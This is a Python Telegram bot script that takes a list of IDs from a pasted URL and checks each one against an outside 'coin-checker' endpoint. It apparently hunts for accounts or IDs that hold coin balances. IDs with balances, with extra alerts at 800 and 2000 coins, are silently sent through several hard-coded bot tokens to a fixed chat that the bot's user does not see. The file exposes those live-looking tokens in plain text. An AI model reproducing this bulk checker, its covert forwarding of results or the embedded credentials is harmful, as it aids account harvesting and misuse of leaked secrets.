import requests, user_agent, json, flask, telebot, random, os, sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

BOT_TOKEN =  "1132931143:AAGwzukJusNzc5XjSvIMS92X8qLtGo9_Im4"
bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)
import telebot, requests
bot = telebot.TeleBot("1132931143:AAGwzukJusNzc5XjSvIMS92X8qLtGo9_Im4")
@bot.message_handler(commands=['get'])
def getID(message):
    numCH = 0
    pastebin = (message.text).replace("/get", "")
    idS = requests.get(str(pastebin)).text.splitlines()
    mas = types.InlineKeyboardMarkup(row_width=2)
    z = types.InlineKeyboardButton(f'ID : 000000000', callback_data="1x")
    m = types.InlineKeyboardButton(f'CHECK : {str(numCH)}', callback_data="1x")
    mas.add(z,m)
    sendM = bot.send_message(message.chat.id, f'- LOADING .....\nPastebin : {pastebin}', reply_markup=mas)
    for fil in idS:
        mas = types.InlineKeyboardMarkup(row_width=2)
        z = types.InlineKeyboardButton(f'ID : {fil}', callback_data="1x")
        m = types.InlineKeyboardButton(f'CHECK : {str(numCH)}', callback_data="1x")
        mas.add(z, m)
        bot.edit_message_text(chat_id=message.chat.id, message_id=sendM.message_id,text= f'- LOADING .....\nPastebin : {pastebin}', reply_markup=mas)
        url = "https://m6hmdhaider.000webhostapp.com/coin-checker.php?oid={}&submit=submit".format(fil)
        #headers = {
        #    "Host": "v3-checker.herokuapp.com",
        #    "Connection": "keep-alive",
        #    "Cache-Control": "max-age=0",
        #    "sec-ch-ua": 'Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
        #    "sec-ch-ua-mobile": "?1",
        #    "sec-ch-ua-platform": "Android",
        #    "X-Chrome-offline": "persist=0 reason=reload",
        #    "Upgrade-Insecure-Requests": "1",
        #    "User-Agent": str(generate_user_agent()),
        #    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        #    "Sec-Fetch-Site": "none",
        #    "Sec-Fetch-Mode": "navigate",
        #    "Sec-Fetch-User": "?1",
        #    "Sec-Fetch-Dest": "document",
        #    "Accept-Encoding": "gzip",
        #    "Accept-Language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"}
        smahi = str(requests.get(url=url).text)
        if 'coins":"' in smahi:
            coin = str(smahi.split('coins":"')[1])
            coins = str(coin.split('"')[0])
            requests.get(f'''https://api.telegram.org/bot1111603340:AAHuKvMBE6z5Sk1rQ_jl-yWi12UVcjBU91U/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
            numCH +=1
            if int(coins) > 800 or int(coins) == 800:
                requests.get( f'''https://api.telegram.org/bot1166194091:AAEEDj7xjmgTt3ipvXTycCK44280OJflUaA/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
                if int(coins) > 2000 or int(coins) == 2000:
                    requests.get( f'''https://api.telegram.org/bot5208965780:AAHhLQrfv_7-LybUzRxt3_heQV13JocX0eY/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
        else:
            numCH += 1

@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200


if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://telegrambooot.herokuapp.com/" + str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
